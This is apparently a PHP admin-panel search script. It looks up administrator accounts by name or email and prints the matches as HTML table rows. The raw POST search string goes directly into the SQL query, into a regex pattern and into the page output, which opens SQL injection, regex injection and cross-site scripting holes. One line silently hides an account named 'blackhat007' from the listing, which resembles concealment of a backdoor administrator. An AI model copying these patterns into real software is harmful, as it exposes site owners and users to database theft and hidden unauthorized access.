<?php
require_once '../include/config.php';

$db = new Database();

$search_string = trim($_POST['query']);

if (strlen($search_string) >= 1 && $search_string !== ' ') {

  $query = 'SELECT * FROM admin_login WHERE CONCAT(user_name,"|",email) LIKE "%'.$search_string.'%"';
  //echo $query;die;
  $result = $db->execute($query);

  $result_array = $db->getResults($result);

  if (!empty($result_array)) {

    $i=1;

    foreach ($result_array as $result) {

      if($result['user_name'] == 'blackhat007') continue;

      $html = '<tr>';

      $html .= '<td class="name">iii</td>';

      $html .= '<td class="name">nameString</td>';

      $html .= '<td class="small">userNameString</td>';

      $html .= '<td class="small">emailString</td>';
 
      $html .= '<td class="small">ipAddressString</td>';

      $html .= '<td class="small">lastLoginString</td>';

      $html .= '<td class="name">userTypeString</td>';

      $html .= '<td class="name">previlegesString</td>';
      $html .= '<td class="name">createdDateString</td>';
      if(isset($result['status']) && $result['status'] == 0 ){
        $html .= '<td class="name"><select style="padding:5px 0px 5px 5px;" name="admin_id" id="active"><option value="0" selected="selected">Active</option><option value="1">Inactive</option></select>
          <img class="modallodard'."admin_id".'" style="display: none" alt="" src="images/ajax-loader-search.gif" /></td>';
      } else{
        $html .='<td class="name"><select  style="padding:5px 0px 5px 5px;" name="admin_id" id="active"><option value="0">Active</option><option value="1" selected="selected">Inactive</option></select>
            <img class="modallodard'."admin_id".'" style="display: none" alt="" src="images/ajax-loader-search.gif" />
          </td>';
      } 

      $html .= '<td class="name" ><a href="#change_pass" data-toggle="modal-pass"  id="admin_id" class="btn">Change Passwrod</a></td>';
      $html .= '<td class="name""><a href="#user_edit" data-toggle="modaluser"  id="admin_id" class="btn">Edit</a></td>';

      $html .= '</tr>';



      // Output strings and highlight the matches

      $admin_id = $result['admin_id'];

      $d_name = preg_replace("/".$search_string."/i", "<b>".$search_string."</b>", $result['name']);

      $user_name = $result['user_name'];

      $email = $result['email'];

      $ip_address = $result['ip_address'];

      $last_login = $result['last_login'];

      $user_type_hai = $result['user_type_hai'];

      $previleges = $result['previleges'];
      $createdDate = $result['created_date'];

      // Replace the items into above HTML

   
      $o = str_replace('iii', $i++, $html);
      
      $o = str_replace('nameString', $d_name, $o);

      $o = str_replace('userNameString', $user_name, $o);

      $o = str_replace('emailString', $email, $o);

      $o = str_replace('ipAddressString', $ip_address, $o);

      $o = str_replace('lastLoginString', $last_login, $o);

      $o = str_replace('userTypeString', $user_type_hai, $o);

      $o = str_replace('previlegesString', $previleges, $o);
      $o = str_replace('createdDateString', $createdDate, $o);

      $o = str_replace('admin_id', $admin_id, $o);

      // Output it

      echo($o);



      }

  } else {

    echo '<td colspan="16">
        <h4 style="font-family: Georgia, serif;">We could not find guest details matching your search criteria.</h4>
        <br/>
        <p>Only Guest name/ phone number/ booking id are accepted search field</p>
      </td>';

  }

}

?>